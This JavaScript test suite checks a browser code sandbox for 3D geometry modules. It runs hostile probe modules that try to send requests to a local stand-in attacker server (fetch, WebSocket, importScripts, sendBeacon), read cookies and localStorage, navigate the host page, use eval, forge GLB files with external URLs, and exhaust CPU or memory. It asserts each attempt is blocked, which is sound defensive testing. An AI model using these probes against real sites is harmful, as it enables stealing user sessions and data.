// Security suite for the geometry code sandbox (patterns: 客户端代码沙箱).
// Real sandbox page, real host code, real browser: hostile modules try to reach
// the network, the site's storage and the host page, or to hang or exhaust the
// sandbox. Every attempt must be blocked or cut off, an attacker server must
// see no request at all, the host page must stay responsive, and the next
// compile must work.
//
// Chromium runs in make check-frontend. WebKit runs by hand:
//   SCENE_SANDBOX_BROWSERS=webkit node --test scripts/scene-sandbox.test.mjs
// UPDATE_SCENE_FIXTURES=1 rewrites creativeglb/testdata/exported-template.glb
// from the default template (then run the Go and frontend fixture tests).
import test, { after, before } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import http from 'node:http'
import os from 'node:os'
import path from 'node:path'
import { chromium, webkit } from 'playwright'
import { build } from 'vite'

const root = path.resolve(import.meta.dirname, '..')
const sandboxDir = path.join(root, 'public/scene-sandbox')
const sandboxSrc = path.join(root, 'src/creative-scene/sandbox')
const templateFixture = path.resolve(root, '../backend/internal/creativeglb/testdata/exported-template.glb')
const browsers = (process.env.SCENE_SANDBOX_BROWSERS ?? 'chromium').split(',').map((s) => s.trim()).filter(Boolean)

// The host code as the editor runs it, bundled for a plain test page.
async function hostScript() {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'scene-sandbox-host-'))
  const entry = path.join(dir, 'entry.ts')
  const from = (f) => JSON.stringify(path.join(sandboxSrc, f))
  writeFileSync(entry, [
    `export { SandboxHost, iframeFactory } from ${from('host.ts')}`,
    `export { inspect, GLBError } from ${from('inspect.ts')}`,
    `export { parseGLB } from ${from('gltf.ts')}`,
    `export { defaultModuleCode } from ${from('template.ts')}`,
  ].join('\n'))
  try {
    const result = await build({
      configFile: false,
      root,
      publicDir: false,
      logLevel: 'warn',
      build: { write: false, minify: false, reportCompressedSize: false, lib: { entry, formats: ['iife'], name: 'SceneHost', fileName: () => 'host.js' } },
    })
    const outputs = Array.isArray(result) ? result : [result]
    return outputs.flatMap((o) => o.output).find((o) => o.type === 'chunk').code
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

const hostPage = `<!doctype html><meta charset="utf-8"><title>host</title><body><div id="root"></div>
<script src="/host.js"></script>
<script>
document.cookie = 'session=secret-cookie; path=/'
localStorage.setItem('token', 'secret-token')
window.ticks = 0
setInterval(() => window.ticks++, 50)
const host = new SceneHost.SandboxHost(SceneHost.iframeFactory(document.getElementById('root')))
const b64 = (buf) => { const u8 = new Uint8Array(buf); let s = ''; for (let i = 0; i < u8.length; i += 32768) s += String.fromCharCode.apply(null, u8.subarray(i, i + 32768)); return btoa(s) }
window.compile = async (code) => {
  const r = await host.compile({ code, params: {}, libVersion: 1 })
  return r.ok ? { ok: true, manifest: r.manifest, glb: b64(r.glb) } : r
}
window.parseExternal = async (base64) => {
  const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0))
  let inspected = 'accepted'
  try { SceneHost.inspect(bytes) } catch (e) { inspected = e.reason }
  let loaded = 'loaded'
  try { await SceneHost.parseGLB(bytes.buffer) } catch (e) { loaded = String(e.message) }
  return { inspected, loaded }
}
</script>`

function listen(server) {
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve(`http://127.0.0.1:${server.address().port}`)))
}

const attackerHits = []
const siteProbes = []
let site = ''
let attacker = ''
let script = ''
const servers = []

before(async () => {
  execFileSync(process.execPath, [path.join(root, 'scripts/build-scene-sandbox.mjs')], { stdio: 'ignore' })
  script = await hostScript()

  // Answers like a willing server (CORS open, right content types), so a probe
  // that is not blocked reports ALLOWED instead of failing on its own.
  const evil = http.createServer((req, res) => {
    attackerHits.push(`${req.method} ${req.url}`)
    const type = req.url === '/sse' ? 'text/event-stream' : 'text/javascript'
    res.writeHead(200, { 'access-control-allow-origin': '*', 'content-type': type }).end(req.url === '/sse' ? 'data: x\n\n' : 'void 0')
  })
  evil.on('upgrade', (req, socket) => {
    attackerHits.push(`UPGRADE ${req.url}`)
    socket.destroy()
  })
  attacker = await listen(evil)

  const csp = readFileSync(path.join(sandboxDir, 'csp.txt'), 'utf8').trim()
  const web = http.createServer((req, res) => {
    const url = new URL(req.url, site)
    if (url.pathname === '/host.html') return res.writeHead(200, { 'content-type': 'text/html' }).end(hostPage)
    if (url.pathname === '/host.js') return res.writeHead(200, { 'content-type': 'text/javascript' }).end(script)
    if (url.pathname === '/scene-sandbox/sandbox.html') {
      return res.writeHead(200, {
        'content-type': 'text/html; charset=utf-8',
        'content-security-policy': csp.replaceAll('{origin}', site),
        'cache-control': 'no-cache',
      }).end(readFileSync(path.join(sandboxDir, 'sandbox.html')))
    }
    const name = url.pathname.match(/^\/scene-sandbox\/(sandbox\.[0-9a-f]+\.js)$/)?.[1]
    if (name) return res.writeHead(200, { 'content-type': 'text/javascript' }).end(readFileSync(path.join(sandboxDir, name)))
    if (url.pathname !== '/favicon.ico') siteProbes.push(`${req.method} ${url.pathname}`)
    res.writeHead(404).end()
  })
  web.on('upgrade', (req, socket) => {
    siteProbes.push(`UPGRADE ${req.url}`)
    socket.destroy()
  })
  site = await listen(web)
  servers.push(evil, web)
})

after(() => {
  for (const s of servers) s.close()
})

const tryIt = `const tryIt = async (out, name, fn) => {
  try { out[name] = 'ALLOWED ' + String(await fn()).slice(0, 80) } catch { out[name] = 'blocked' }
}
const within = (ms, p) => Promise.race([p, new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), ms))])`

// A module whose build runs `attack` in the compile Worker and reports what
// happened through the error message.
function probe(attack) {
  return `export const mount = 'free'
${tryIt}
export default async function build() {
  const report = await (${attack})(${JSON.stringify({ A: attacker, S: site })}, tryIt, within)
  throw new Error('REPORT ' + JSON.stringify(report))
}
`
}

const network = async ({ A, S }, tryIt, within) => {
  const out = {}
  await tryIt(out, 'fetch', () => fetch(A + '/fetch').then((r) => r.status))
  await tryIt(out, 'fetch site with cookies', () => fetch(S + '/api/v1/me', { credentials: 'include' }).then((r) => r.status))
  await tryIt(out, 'xhr', () => within(1500, new Promise((resolve, reject) => {
    const x = new XMLHttpRequest()
    x.open('GET', A + '/xhr')
    x.onload = () => resolve(x.status)
    x.onerror = () => reject(new Error('xhr'))
    x.send()
  })))
  await tryIt(out, 'websocket', () => within(1500, new Promise((resolve, reject) => {
    const ws = new WebSocket(A.replace('http', 'ws') + '/ws')
    ws.onopen = () => resolve('open')
    ws.onerror = () => reject(new Error('ws'))
  })))
  await tryIt(out, 'eventsource', () => within(1500, new Promise((resolve, reject) => {
    const es = new EventSource(A + '/sse')
    es.onopen = () => resolve('open')
    es.onerror = () => { es.close(); reject(new Error('sse')) }
  })))
  await tryIt(out, 'importScripts', () => { importScripts(A + '/script.js'); return 'imported' })
  await tryIt(out, 'importScripts site', () => { importScripts(S + '/api/v1/me'); return 'imported' })
  await tryIt(out, 'nested worker fetch', () => within(1500, new Promise((resolve, reject) => {
    const src = `fetch(${JSON.stringify(A + '/nested')}).then(() => postMessage('ok'), () => postMessage('blocked'))`
    const w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' })))
    w.onmessage = (m) => (m.data === 'ok' ? resolve('ok') : reject(new Error('blocked')))
    w.onerror = () => reject(new Error('worker'))
  })))
  await tryIt(out, 'sendBeacon', () => navigator.sendBeacon(A + '/beacon', 'x'))
  return out
}

const storage = async ({ S }, tryIt, within) => {
  const out = {}
  await tryIt(out, 'document.cookie', () => document.cookie)
  await tryIt(out, 'localStorage', () => localStorage.getItem('token'))
  await tryIt(out, 'sessionStorage', () => sessionStorage.length)
  await tryIt(out, 'indexedDB', () => within(1500, new Promise((resolve, reject) => {
    const r = indexedDB.open('probe')
    r.onsuccess = () => resolve('opened')
    r.onerror = () => reject(r.error)
  })))
  await tryIt(out, 'cookieStore', () => cookieStore.getAll().then((c) => c.length))
  await tryIt(out, 'parent.document', () => parent.document.title)
  await tryIt(out, 'top.location', () => { top.location.href = S + '/navigated'; return 'navigated' })
  return out
}

const evaluation = async (_, tryIt, within) => {
  const out = {}
  // oxlint-disable-next-line no-eval -- the probe checks that the CSP blocks eval
  await tryIt(out, 'eval', () => eval('1 + 1'))
  await tryIt(out, 'Function', () => new Function('return 1')())
  await tryIt(out, 'setTimeout string', () => within(500, new Promise((resolve) => {
    self.ran = () => resolve('ran')
    setTimeout('self.ran()', 0)
  })))
  return out
}

// Answers before build returns, with a GLB that points at the attacker. The
// host must reject it without loading anything.
const forgedResult = async ({ A }) => {
  const json = JSON.stringify({
    asset: { version: '2.0' },
    buffers: [{ uri: A + '/buffer.bin', byteLength: 36 }],
    bufferViews: [{ buffer: 0, byteLength: 36 }],
    accessors: [{ bufferView: 0, componentType: 5126, count: 3, type: 'VEC3', min: [0, 0, 0], max: [1, 1, 0] }],
    images: [{ uri: A + '/texture.png' }],
    textures: [{ source: 0 }],
    materials: [{ pbrMetallicRoughness: { baseColorTexture: { index: 0 } } }],
    meshes: [{ primitives: [{ attributes: { POSITION: 0 }, material: 0 }] }],
    nodes: [{ mesh: 0 }],
    scenes: [{ nodes: [0] }],
    scene: 0,
  })
  const text = new TextEncoder().encode(json)
  const pad = Math.ceil(text.length / 4) * 4
  const glb = new Uint8Array(20 + pad).fill(0x20)
  const v = new DataView(glb.buffer)
  v.setUint32(0, 0x46546c67, true)
  v.setUint32(4, 2, true)
  v.setUint32(8, glb.length, true)
  v.setUint32(12, pad, true)
  v.setUint32(16, 0x4e4f534a, true)
  glb.set(text, 20)
  const module = { contract_version: 1, lib_version: 1, mount: 'free', params_schema: {}, params: {} }
  self.postMessage({ type: 'result', id: 0, ok: true, glb: glb.buffer, module }, [glb.buffer])
  await new Promise(() => {})
}

const loop = `export const mount = 'free'
export default function build() { for (;;) {} }
`
const memoryBomb = `export const mount = 'free'
export default function build() { const keep = []; for (;;) keep.push(new Float64Array(1 << 24)) }
`
// 3 million triangles: the Worker refuses to send a GLB over 16 MiB.
const hugeOutput = `export const mount = 'free'
export default function build({ THREE, lib }) {
  const p = new Float32Array(3000000 * 9)
  for (let i = 0; i < p.length; i++) p[i] = (i % 7) * 0.01
  const g = new THREE.BufferGeometry()
  g.setAttribute('position', new THREE.BufferAttribute(p, 3))
  return new THREE.Mesh(g, lib.material('a'))
}
`
// Small file, too many triangles: the host's own count rejects it.
const manyTriangles = `export const mount = 'free'
export default function build({ THREE, lib }) {
  const g = new THREE.BufferGeometry()
  g.setAttribute('position', new THREE.BufferAttribute(new Float32Array([0, 0, 0, 1, 0, 0, 0, 1, 0]), 3))
  g.setIndex(new THREE.BufferAttribute(new Uint32Array(300001 * 3).fill(0).map((_, i) => i % 3), 1))
  return new THREE.Mesh(g, lib.material('a'))
}
`

// The template GLB with a texture whose image points at the attacker, for the
// loader's URL restriction on its own.
function externalTextureGLB() {
  const src = readFileSync(templateFixture)
  const jsonLen = src.readUInt32LE(12)
  const doc = JSON.parse(src.subarray(20, 20 + jsonLen).toString('utf8'))
  const bin = src.subarray(20 + jsonLen + 8)
  doc.images = [{ uri: attacker + '/texture.png' }]
  doc.textures = [{ source: 0 }]
  for (const m of doc.materials) m.pbrMetallicRoughness = { ...m.pbrMetallicRoughness, baseColorTexture: { index: 0 } }
  const text = Buffer.from(JSON.stringify(doc))
  const json = Buffer.concat([text, Buffer.alloc((4 - (text.length % 4)) % 4, 0x20)])
  const head = Buffer.alloc(20)
  head.writeUInt32LE(0x46546c67, 0)
  head.writeUInt32LE(2, 4)
  head.writeUInt32LE(20 + json.length + 8 + bin.length, 8)
  head.writeUInt32LE(json.length, 12)
  head.writeUInt32LE(0x4e4f534a, 16)
  const binHead = Buffer.alloc(8)
  binHead.writeUInt32LE(bin.length, 0)
  binHead.writeUInt32LE(0x004e4942, 4)
  return Buffer.concat([head, json, binHead, bin]).toString('base64')
}

function report(result) {
  assert.equal(result.ok, false)
  const m = /REPORT (\{.*\})$/.exec(result.error.message)
  assert.ok(m, `no report in ${JSON.stringify(result)}`)
  return JSON.parse(m[1])
}

function assertBlocked(name, result) {
  for (const [probe, outcome] of Object.entries(report(result))) assert.equal(outcome, 'blocked', `${name}: ${probe} ${outcome}`)
}

for (const name of browsers) {
  test(`sandbox containment in ${name}`, async () => {
    const browser = name === 'webkit' ? await webkit.launch() : await chromium.launch()
    try {
      const page = await browser.newPage()
      await page.goto(site + '/host.html')
      const compile = (code) => page.evaluate((c) => window.compile(c), code)
      const ticks = () => page.evaluate(() => window.ticks)

      // The template still exports to the shared fixture, byte for byte.
      const template = await page.evaluate(() => window.compile(SceneHost.defaultModuleCode))
      assert.ok(template.ok, JSON.stringify(template))
      const bytes = Buffer.from(template.glb, 'base64')
      if (process.env.UPDATE_SCENE_FIXTURES === '1') writeFileSync(templateFixture, bytes)
      assert.ok(bytes.equals(readFileSync(templateFixture)), 'GLTFExporter output changed: rerun with UPDATE_SCENE_FIXTURES=1, then the Go and frontend fixture tests')

      assertBlocked('network', await compile(probe(network)))
      assertBlocked('storage', await compile(probe(storage)))
      assertBlocked('evaluation', await compile(probe(evaluation)))

      for (const code of [
        `import * as x from ${JSON.stringify(attacker + '/x.js')}\nexport const mount = 'free'\nexport default () => null\n`,
        `export const mount = 'free'\nexport default async function build() { return import(${JSON.stringify(attacker + '/x.js')}) }\n`,
        `export * from ${JSON.stringify(site + '/api/v1/me')}\n`,
      ]) {
        const r = await compile(code)
        assert.equal(r.error?.kind, 'invalid', code)
      }

      const notObject = await compile(`export const mount = 'free'\nexport default function build() { return { scale: 1 } }\n`)
      assert.deepEqual(notObject.error, { kind: 'invalid', message: 'build 须返回 THREE.Object3D' })

      const forged = await compile(probe(forgedResult))
      assert.equal(forged.ok, false)
      assert.equal(forged.error.kind, 'invalid', JSON.stringify(forged))

      const external = await page.evaluate((b) => window.parseExternal(b), externalTextureGLB())
      assert.equal(external.inspected, 'unsupported_feature')
      assert.match(external.loaded, /外部地址/)

      const before = await ticks()
      const hung = await compile(loop)
      const during = (await ticks()) - before
      assert.deepEqual(hung, { ok: false, error: { kind: 'timeout', message: '编译超过 5 秒，已中止' } })
      assert.ok(during >= 60, `host timers kept running during the loop (${during} ticks)`)

      const bomb = await compile(memoryBomb)
      assert.ok(!bomb.ok && ['runtime', 'timeout'].includes(bomb.error.kind), JSON.stringify(bomb))
      const huge = await compile(hugeOutput)
      assert.deepEqual(huge.error, { kind: 'limit', message: 'GLB 超过 16 MiB' })
      const many = await compile(manyTriangles)
      assert.equal(many.error?.kind, 'limit', JSON.stringify(many))

      const again = await compile(await page.evaluate(() => SceneHost.defaultModuleCode))
      assert.ok(again.ok, 'compiles still work afterwards')
      assert.equal(page.url(), site + '/host.html', 'the host page was not navigated')
      assert.equal(await page.evaluate(() => document.querySelectorAll('iframe').length), 1)
      assert.deepEqual(await page.evaluate(() => [document.cookie, localStorage.getItem('token')]), ['session=secret-cookie', 'secret-token'])
      assert.deepEqual(attackerHits, [], 'the attacker server saw no request')
      assert.deepEqual(siteProbes, [], 'nothing but the sandbox files was requested from the site')
    } finally {
      await browser.close()
    }
  })
}
